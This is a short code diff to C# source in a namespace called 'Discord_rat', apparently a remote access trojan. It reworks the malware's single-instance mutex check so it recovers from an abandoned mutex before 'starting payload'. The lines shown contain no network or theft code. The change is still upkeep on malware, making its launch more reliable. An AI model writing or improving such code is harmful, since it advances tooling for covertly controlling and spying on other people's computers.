@@ -319,11 +319,26 @@ namespace Discord_rat
 
         public static void Start()
         {
-            bool created;
-            instanceMutex = new Mutex(true, GetInstanceMutexName(), out created);
-            if (!created)
+            string mutexName = GetInstanceMutexName();
+            try
             {
-                LogDebug("Mutex already held, exiting Start()");
+                instanceMutex = new Mutex(false, mutexName);
+                try
+                {
+                    if (!instanceMutex.WaitOne(0))
+                    {
+                        LogDebug("Mutex already held, exiting Start()");
+                        return;
+                    }
+                }
+                catch (AbandonedMutexException)
+                {
+                    LogDebug("Recovered abandoned mutex, starting payload");
+                }
+            }
+            catch (Exception ex)
+            {
+                LogDebug("Mutex error: " + ex.Message);
                 return;
             }
 
